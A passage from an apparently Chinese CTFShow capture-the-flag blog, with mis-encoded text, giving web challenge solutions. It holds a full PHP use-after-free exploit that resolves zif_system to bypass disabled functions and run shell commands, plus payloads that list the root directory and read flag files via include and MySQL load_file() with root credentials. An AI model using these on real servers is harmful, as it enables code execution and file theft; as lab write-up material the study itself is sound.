class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠŠè¿™ä¸ªè„šæœ¬ URL ç¼–ç :</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web72.png"></p>
<h2 id="web73â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web73â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web73â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web73â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>ä¸ä¸Šä¸€é¢˜ç±»ä¼¼: åˆ©ç”¨ glob:///* æ‰«ææ ¹ç›®å½•ä¸‹æ–‡ä»¶ : flagc.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>ç„¶å:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>å³å¯å¾—åˆ° flag</p>
<h2 id="web74â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web74â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web74â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web74â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web75â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web75â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web75â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web75â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>é¦–å…ˆæ‰«æ ¹ç›®å½•ï¼š å¾—åˆ° flag36.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>éªšå§¿åŠ¿åˆ©ç”¨ MySQL load_file() æ¥è¯»å–æ–‡ä»¶; ğŸ‚ğŸº</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$conn</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web75.png"></p>
<h2 id="web76â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web76â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web76â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web76â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-FFI"><a href="#web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-FFI" class="headerlink" title="web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” FFI"></a>web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” FFI</h2><p>ä¸ä¼š</p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow-ååºåˆ—åŒ–</title>
    <url>/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="CTFShow-ååºåˆ—åŒ–"><a href="#CTFShow-ååºåˆ—åŒ–" class="headerlink" title="CTFShow ååºåˆ—åŒ–"></a>CTFShow ååºåˆ—åŒ–</h1><span id="more"></span>

<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>ä½œååºåˆ—åŒ–è¿™ç±»é¢˜ï¼Œä¸èƒ½ç€æ€¥ã€‚è¦è¯»æ‡‚æ¯ä¸€è¡Œä»£ç çš„æ„æ€ã€‚</li>
<li>è¿™ç±»é¢˜ç¦»ä¸å¼€ä¸€ä¸ª å…³é”®è¯ï¼š<strong>serialize</strong> : è¿™æ˜¯åºåˆ—åŒ–ï¼Œ <strong>unserialize</strong>: unå¼€å¤´çš„å‰ç¼€ä½ç›¸åçš„æ„æ€åˆ™ï¼š ååºåˆ—åŒ–ã€‚</li>
<li>åœ¨è¿™é“é¢˜ä¸­æ²¡æœ‰å‡ºç° <strong>serialize</strong> , è¿™ä¸€é¢˜å¯ä»¥ç†è§£ä¸ºåç»­é¢˜ç›®çš„å¯¼è¯»ã€‚è¿™é“é¢˜ç›´æ¥å‘Šè¯‰ä½ ï¼Œè¦å°† usernameå’Œpasswordéƒ½ç­‰äº xxxxxx</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web254.png"></p>
<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span 